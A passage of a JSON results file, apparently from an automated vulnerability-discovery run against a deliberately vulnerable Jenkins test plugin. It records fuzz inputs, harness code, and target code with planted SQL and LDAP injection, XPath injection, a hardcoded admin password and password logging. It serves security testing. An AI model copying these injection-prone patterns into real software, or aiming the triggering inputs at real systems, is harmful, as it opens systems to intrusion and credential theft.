}\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java:\n 63       @RequirePOST\n 64       public void doGetName(\n 65               StaplerRequest request, StaplerResponse response) throws IOException {\n 66           String id = request.getParameter(\"ID\");\n 67           String pw = request.getParameter(\"PW\");\n 68           String responseString;\n 69   \n 70           try (\n 71                   Connection conn = getConnection();\n 72                   Statement stmt = conn.createStatement()) {\n 73               ResultSet rs = stmt\n 74                       .executeQuery(\"SELECT name FROM users WHERE id = '\" + id + \"' AND password = '\" + pw + \"'\");\n 75               if (rs.next()) {\n 76                   responseString = rs.getString(\"name\");\n 77                   response.setContentType(\"text/plain\");\n 78                   response.getWriter().write(responseString);\n 79               } else {\n 80                   response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 81               }\n 82           } catch (SQLException e) {\n 83               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n 84           }\n 85       }\n",
            "cost": 0.388085,
            "harness_id": "id_3",
            "sanitizer": "SQL Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java:74:35",
            "status": "corpus",
            "valid_path": "YES",
            "id": 14
        },
        {
            "blob": [
                "AAAAJm5hbWUAbm90YWRtaW4xAHBhc3N3b3JkAHdyb25ncGFzczE="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.38675000000000004,
            "harness_id": "id_3",
            "sanitizer": "Remote JNDI Lookup",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:63:26",
            "status": "corpus",
            "valid_path": "YES",
            "id": 15
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n235       void testAuthAction(ByteBuffer buf) {\n236           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n237           if (parts.length != 4) {\n238               return;\n239           }\n240   \n241           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n242           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n243           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n244           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n245   \n246           AuthAction action = new AuthAction();\n247           try {\n248               action.authenticateAsAdmin(req, rsp);\n249           } catch (IOException | NamingException e) {}\n250       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:\n190       private boolean isAdmin(DirContext dirContext, SearchControls controls, String name) throws NamingException {\n191           String searchFilter = \"(&(objectClass=inetOrgPerson)(description=admin))\";\n192           try {\n193               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n194                       controls);\n195               while (results.hasMore()) {\n196                   SearchResult result = results.next();\n197                   if (result.getAttributes().get(\"cn\").get().equals(name)) {\n198                       return true;\n199                   }\n200               }\n201           } catch (Exception e) {\n202           }\n203           return false;\n204       }\n206       @RequirePOST\n207       public void authenticateAsAdmin(StaplerRequest request, StaplerResponse response)\n208               throws IOException, NamingException {\n209           if (!request.hasParameter(\"username\") || !request.hasParameter(\"key\")) {\n210               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n211               return;\n212           }\n213           String username = request.getParameter(\"username\");\n214           String key = request.getParameter(\"key\");\n215           response.setContentType(\"application/json\");\n216           PrintWriter writer = response.getWriter();\n217   \n218           DirContext dirContext = null;\n219           try {\n220               dirContext = new InitialDirContext(getDefaultEnv());\n221               SearchControls controls = new SearchControls();\n222               controls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n223               controls.setReturningAttributes(new String[] { \"cn\" });\n224               if (!isAdmin(dirContext, controls, username)) {\n225                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n226                   return;\n227               }\n228               String searchFilter = \"(&(objectClass=inetOrgPerson)(cn=\" + username + \")(userPassword=\" + key + \"))\";\n229               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n230                       controls);\n231               if (results.hasMore()) {\n232                   writer.print(\"{\\\"status\\\": \\\"success\\\"}\");\n233               } else {\n234                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n235               }\n236           } catch (NamingException e) {\n237               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n238           }\n239           if (dirContext != null) {\n240               try {\n241                   dirContext.close();\n242               } catch (NamingException e) {\n243               }\n244           }\n245       }\n",
            "cost": 0.051855,
            "harness_id": "id_3",
            "sanitizer": "LDAP Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:193:73",
            "status": "corpus",
            "valid_path": "NO",
            "id": 16
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n235       void testAuthAction(ByteBuffer buf) {\n236           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n237           if (parts.length != 4) {\n238               return;\n239           }\n240   \n241           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n242           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n243           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n244           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n245   \n246           AuthAction action = new AuthAction();\n247           try {\n248               action.authenticateAsAdmin(req, rsp);\n249           } catch (IOException | NamingException e) {}\n250       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:\n190       private boolean isAdmin(DirContext dirContext, SearchControls controls, String name) throws NamingException {\n191           String searchFilter = \"(&(objectClass=inetOrgPerson)(description=admin))\";\n192           try {\n193               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n194                       controls);\n195               while (results.hasMore()) {\n196                   SearchResult result = results.next();\n197                   if (result.getAttributes().get(\"cn\").get().equals(name)) {\n198                       return true;\n199                   }\n200               }\n201           } catch (Exception e) {\n202           }\n203           return false;\n204       }\n206       @RequirePOST\n207       public void authenticateAsAdmin(StaplerRequest request, StaplerResponse response)\n208               throws IOException, NamingException {\n209           if (!request.hasParameter(\"username\") || !request.hasParameter(\"key\")) {\n210               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n211               return;\n212           }\n213           String username = request.getParameter(\"username\");\n214           String key = request.getParameter(\"key\");\n215           response.setContentType(\"application/json\");\n216           PrintWriter writer = response.getWriter();\n217   \n218           DirContext dirContext = null;\n219           try {\n220               dirContext = new InitialDirContext(getDefaultEnv());\n221               SearchControls controls = new SearchControls();\n222               controls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n223               controls.setReturningAttributes(new String[] { \"cn\" });\n224               if (!isAdmin(dirContext, controls, username)) {\n225                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n226                   return;\n227               }\n228               String searchFilter = \"(&(objectClass=inetOrgPerson)(cn=\" + username + \")(userPassword=\" + key + \"))\";\n229               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n230                       controls);\n231               if (results.hasMore()) {\n232                   writer.print(\"{\\\"status\\\": \\\"success\\\"}\");\n233               } else {\n234                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n235               }\n236           } catch (NamingException e) {\n237               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n238           }\n239           if (dirContext != null) {\n240               try {\n241                   dirContext.close();\n242               } catch (NamingException e) {\n243               }\n244           }\n245       }\n",
            "cost": 0.051355,
            "harness_id": "id_3",
            "sanitizer": "LDAP Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:193:103",
            "status": "corpus",
            "valid_path": "NO",
            "id": 17
        },
        {
            "blob": [
                "AAAAvnVzZXJuYW1lACgAa2V5AHBhc3N3b3JkAA=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n235       void testAuthAction(ByteBuffer buf) {\n236           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n237           if (parts.length != 4) {\n238               return;\n239           }\n240   \n241           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n242           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n243           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n244           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n245   \n246           AuthAction action = new AuthAction();\n247           try {\n248               action.authenticateAsAdmin(req, rsp);\n249           } catch (IOException | NamingException e) {}\n250       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:\n206       @RequirePOST\n207       public void authenticateAsAdmin(StaplerRequest request, StaplerResponse response)\n208               throws IOException, NamingException {\n209           if (!request.hasParameter(\"username\") || !request.hasParameter(\"key\")) {\n210               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n211               return;\n212           }\n213           String username = request.getParameter(\"username\");\n214           String key = request.getParameter(\"key\");\n215           response.setContentType(\"application/json\");\n216           PrintWriter writer = response.getWriter();\n217   \n218           DirContext dirContext = null;\n219           try {\n220               dirContext = new InitialDirContext(getDefaultEnv());\n221               SearchControls controls = new SearchControls();\n222               controls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n223               controls.setReturningAttributes(new String[] { \"cn\" });\n224               if (!isAdmin(dirContext, controls, username)) {\n225                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n226                   return;\n227               }\n228               String searchFilter = \"(&(objectClass=inetOrgPerson)(cn=\" + username + \")(userPassword=\" + key + \"))\";\n229               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n230                       controls);\n231               if (results.hasMore()) {\n232                   writer.print(\"{\\\"status\\\": \\\"success\\\"}\");\n233               } else {\n234                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n235               }\n236           } catch (NamingException e) {\n237               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n238           }\n239           if (dirContext != null) {\n240               try {\n241                   dirContext.close();\n242               } catch (NamingException e) {\n243               }\n244           }\n245       }\n",
            "cost": 0.39954500000000004,
            "harness_id": "id_3",
            "sanitizer": "LDAP Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:229:73",
            "status": "corpus",
            "valid_path": "YES",
            "id": 18
        },
        {
            "blob": [
                "AAAASXBhcmFtAHZhbHVlAGRvY3VtZW50KDIp"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n",
            "cost": 0.43518500000000004,
            "harness_id": "id_3",
            "sanitizer": "XPath Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:125:43",
            "status": "corpus",
            "valid_path": "YES",
            "id": 19
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n235       private boolean permit(StaplerRequest req) {\n236           for (SecureRequester r : ExtensionList.lookup(SecureRequester.class)) {\n237               if (r.permit(req, bean)) {\n238                   return true;\n239               }\n240           }\n241           return false;\n242       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionList.java:\n169       @Override\n170       public @NonNull Iterator<T> iterator() {\n171           // we need to intercept mutation, so for now don't allow Iterator.remove\n172           return new AdaptedIterator<>(Iterators.readOnly(ensureLoaded().iterator())) {\n173               @Override\n174               protected T adapt(ExtensionComponent<T> item) {\n175                   return item.getInstance();\n176               }\n177           };\n178       }\n312       private List<ExtensionComponent<T>> ensureLoaded() {\n313           if (extensions != null)\n314               return extensions; // already loaded\n315           if (jenkins == null || jenkins.getInitLevel().compareTo(InitMilestone.PLUGINS_PREPARED) < 0)\n316               return legacyInstances; // can't perform the auto discovery until all plugins are loaded, so just make the legacy instances visible\n317   \n318           synchronized (getLoadLock()) {\n319               if (extensions == null) {\n320                   List<ExtensionComponent<T>> r = load();\n321                   r.addAll(legacyInstances);\n322                   extensions = sort(r);\n323               }\n324               return extensions;\n325           }\n326       }\n378       protected List<ExtensionComponent<T>> load() {\n379           LOGGER.fine(() -> String.format(\"Loading ExtensionList '%s'\", extensionType.getName()));\n380           if (LOGGER.isLoggable(Level.FINER)) {\n381               LOGGER.log(Level.FINER, String.format(\"Loading 